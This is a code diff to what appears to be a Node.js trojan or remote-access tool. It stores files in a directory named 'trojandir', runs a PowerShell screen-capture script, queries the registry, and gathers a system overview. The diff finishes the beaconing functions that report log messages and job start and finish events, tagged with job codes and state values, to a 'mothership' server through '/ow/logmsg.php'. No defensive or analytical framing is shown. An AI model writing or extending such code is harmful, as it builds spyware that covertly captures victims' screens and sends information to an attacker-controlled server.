@@ -79,8 +79,6 @@ const util = require("util");
 
 const ISDEBUG = true;
 
-let LOGMSGMOTHERSHIP = false;
-
 const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
 var process_argv = [];
@@ -1558,9 +1556,6 @@ function logmsg(msgstr) {
 
     if (systemstate)
         fs.appendFileSync(systemstate.logfpath, msgout + "\r\n", "utf8");
-
-    if ( LOGMSGMOTHERSHIP )
-        logMsgMothership(msgstr.slice(0, 80));
 
 }
 
@@ -4079,14 +4074,18 @@ function exec_getscreencapture() {
     });
 }
 
-// TODO
-// implement logging mechanism to write log msgs back to mothership
+// anchor
 async function getscreencapture() {
-    LOGMSGMOTHERSHIP = true;
 
     logmsg("starting");
-
+    
     let runningcmd = systemstate.cmdconfig;
+
+    let ret = null;
+
+    ret = await logMsgMothership(`starting getscreencapture -- jobcode=${runningcmd.jobcode}`);
+
+    ret = await logEventMothership('job_started',runningcmd.jobcode);
     
     let filename = 'get_full_screen_capture.ps1'; // TODO move to systemconfig
     let localpath = path.join(systemstate.trojandir, filename);
@@ -4098,8 +4097,6 @@ async function getscreencapture() {
     if ( ! fileExists(localpath) ) {
         throw new Error(`screencapture script does not exist ${localpath}`);
     }
-
-    // TODO: log event startjob
 
     let stdout = await exec_getscreencapture();
 
@@ -4118,8 +4115,11 @@ async function getscreencapture() {
         }
     }
     
+    ret = await logEventMothership('job_finished',runningcmd.jobcode);
+    
+    // job_finished_with_error
+
     process.exit(0);
-    // TODO: log event job_finished
 }
 
 function query_reg(reg_path) {
@@ -4239,22 +4239,21 @@ async function getsystemoverview() {
 
 // ---
 
-// TODO anchor
-function logMsgMothership(msg) {
-
+async function logMsgMothership(msg, isevent=false, jobcode) {
     let baseUrl = systemstate.mothership + '/ow/logmsg.php';
 
     let kvp = systemstate.statekvp;
 
-    kvp['msg'] = msg;
+    kvp[isevent ? 'event' : 'msg'] = msg;
+    kvp['jobcode'] = jobcode;
 
-    let response = makeGetRequest(baseUrl, params);    
+    let response = await makeGetRequest(baseUrl, kvp);
+    return response;
 }
 
-// TODO
 // make GET request to logmsg.php with event = event_code
-function logEventMothership(event_code, kvp) {
-    // TODO: write msgstr to mothership
+function logEventMothership(event_code, jobcode) {
+    return logMsgMothership(event_code, true, jobcode);
 }
 
 // ---
